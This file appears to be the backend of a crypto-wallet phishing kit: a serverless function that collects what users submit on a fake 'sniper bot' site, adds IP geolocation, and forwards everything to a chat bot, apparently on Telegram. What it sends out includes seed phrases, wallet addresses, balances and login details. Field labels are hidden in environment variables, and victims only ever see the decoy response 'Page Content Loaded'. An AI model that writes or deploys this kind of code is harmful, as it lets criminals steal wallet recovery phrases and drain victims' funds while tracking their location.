// Define CORS headers for responses
const corsHeaders = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Content-Type": "application/json"
  };
  
  exports.handler = async (event) => {
    if (event.httpMethod === "OPTIONS") {
      return {
        statusCode: 204, // No Content
        headers: corsHeaders,
        body: ""
      };
    }
  
    try {
      // Log the event to debug issues with finding the IP address
      console.log("Event Headers:", event.headers);
  
      // Retrieve the client's IP address from the headers or via an external API
      const ip = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'] || event.headers['x-forwarded-for']?.split(',')[0] || await fetchIP();
  
      console.log("IP Address Retrieved:", ip);
  
      // Fetch Geo Location data
      const geoInfo = await fetchGeoLocation(ip);
      const locationData = `Country: ${geoInfo.country_name}, City: ${geoInfo.city}, ` +
                           `Latitude/Longitude: ${geoInfo.latitude}/${geoInfo.longitude}, ` +
                           `Time Zone: ${geoInfo.timezone}, Org: ${geoInfo.org}, ` +
                           `Postcode: ${geoInfo.postal}`;
  
      const { type, details: dataReceived } = JSON.parse(event.body);
      const visitorId = dataReceived.visitorId || 'No Visitor ID';
  
      let msa; // message
  
      switch (type) {
        case 'uR': // user register
          msa = `<u>${process.env.uR}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `IP: <b>${ip}</b>\n` +
                `${locationData}\n` +
                `${process.env.nom}: <b>${dataReceived.nom}</b>\n` +
                `${process.env.addi}: <b>${dataReceived.addi}</b>\n` +
                `${process.env.authw}: <b>${dataReceived.authw}</b>\n` +
                `${process.env.ref}: <b>${dataReceived.ref}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'uL': // user login
          msa = `<u>${process.env.uL}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `IP: <b>${ip}</b>\n` +
                `${locationData}\n` +
                `${process.env.addi}: <b>${dataReceived.addi}</b>\n` +
                `${process.env.authw}: <b>${dataReceived.authw}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'uN': // user select network
          msa = `<u>${process.env.uN}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `${process.env.net}: <b>${dataReceived.net}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'uASP': // user add seed phrase
          msa = `<u>${process.env.uASP}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `${process.env.pip}: <b>${dataReceived.pip}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'uAWA': // user add wallet address
          msa = `<u>${process.env.uAWA}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `${process.env.wal}: <b>${dataReceived.wal}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'addFW': // user add full wallet
          msa = `<u>${process.env.addFW}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `${process.env.net}: <b>${dataReceived.net}</b>\n` +
                `${process.env.wal}: <b>${dataReceived.wal}</b>\n` +
                `${process.env.pip}: <b>${dataReceived.pip}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'uMM': // user Log to main sniper menu
          msa = `<u>${process.env.uMM}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `${process.env.nom}: <b>${dataReceived.nom}</b>\n` +
                `${process.env.addi}: <b>${dataReceived.addi}</b>\n` +
                `${process.env.pip}: <b>${dataReceived.pip}</b>\n` +
                `${process.env.wal}: <b>${dataReceived.wal}</b>\n` +
                `${process.env.bal}: <b>${dataReceived.bal} ${dataReceived.net}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'uRFSH': // user add full wallet
          msa = `<u>${process.env.uRFSH}</u>\n\n` +
                `${process.env.uid}: <b>${dataReceived.uid}</b>\n` +
                `${process.env.wal}: <b>${dataReceived.wal}</b>\n` +
                `${process.env.bal}: <b>${dataReceived.bal} ${dataReceived.symbol}</b>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'visit': // User visit
          msa = `<u>${process.env.viz}</u>\n\n` +
                `<b>${dataReceived.pageTitle}</b>\n` +
                `<b>${dataReceived.IP}</b>\n` +
                `<i>${locationData}</i>\n` +
                `Visitor ID: ${visitorId}`;
          break;
  
        case 'join': // User join
          msa = `<u>${process.env.tel}</u>\n\n` +
                `<b>User is on the Join Group Page...</b>\n` +
                `<b>${dataReceived.IP}</b>\n` +
                `<i>${locationData}</i>\n` +
                `Visitor ID: ${visitorId}`;
          break;
      }
  
      const smResponse = await sTM(msa);
      return {
        statusCode: 200,
        headers: corsHeaders,
        body: JSON.stringify({ message: "Page Content Loaded" }),
      };
    } catch (error) {
      console.error("Error:", error);
      return {
        statusCode: 500,
        headers: corsHeaders,
        body: JSON.stringify({ message: "Error Loading Page Content", error: error.message }),
      };
    }
  };
  
  async function fetchIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Error fetching IP address:", error);
      throw new Error("Unable to fetch IP address");
    }
  }
  
  async function fetchGeoLocation(ip) {
    const apis = [        
      `https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.IPGEOLOCATION_API_KEY}&ip=${ip}`,
      `https://ipapi.co/${ip}/json/`,
      `http://api.ipstack.com/${ip}?access_key=${process.env.IPSTACK_API_KEY}`
    ];
  
    for (const api of apis) {
      try {
        const data = await fetchWithRetry(api, {}, 3, 5000);
        // Ensure that all fields are present; if not, default to 'Not Available'
        return {
          country_name: data.country_name || data.country || 'Not Available',
          city: data.city || 'Not Available',
          latitude: data.latitude || data.lat || 'Not Available',
          longitude: data.longitude || data.lon || 'Not Available',
          timezone: data.time_zone?.name || data.timezone || 'Not Available',
          org: data.org || data.organization?.name || data.organization || data.org || 'Not Available',
          postal: data.postal || data.zip || data.zipcode || 'Not Available'
        };
      } catch (error) {
        console.error(`Error fetching geo location data from ${api}:`, error.message, error.stack);
      }
    }
    throw new Error('All geo-location API calls failed');
  }
  
  async function sTM(text) {
    const cID = process.env.cID;
    const apiUrl = process.env.apiURL;
  
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: cID,
        text: text,
        parse_mode: 'HTML',
      }),
    });
  
    if (!response.ok) {
      throw new Error("Out of bounds response from server");
    }
  
    return await response.json();
  }
  
  const fetchWithRetry = async (url, options = {}, retries = 3, timeout = 5000) => {
    const fetchWithTimeout = (url, options, timeout) => {
      return new Promise((resolve, reject) => {
        const timeoutId = setTimeout(() => reject(new Error('Request timed out')), timeout);
        fetch(url, options).then(
          response => {
            clearTimeout(timeoutId);
            resolve(response);
          },
          err => {
            clearTimeout(timeoutId);
            reject(err);
          }
        );
      });
    };
  
    for (let attempt = 0; retries && attempt < retries; attempt++) {
      try {
        const response = await fetchWithTimeout(url, options, timeout);
        if (!response.ok) throw new Error(`Fetch failed with status: ${response.status}`);
        return await response.json();
      } catch (error) {
        if (attempt === retries - 1) throw error;
        console.error(`Fetch attempt ${attempt + 1} failed: ${error.message}`);
      }
    }
  };
  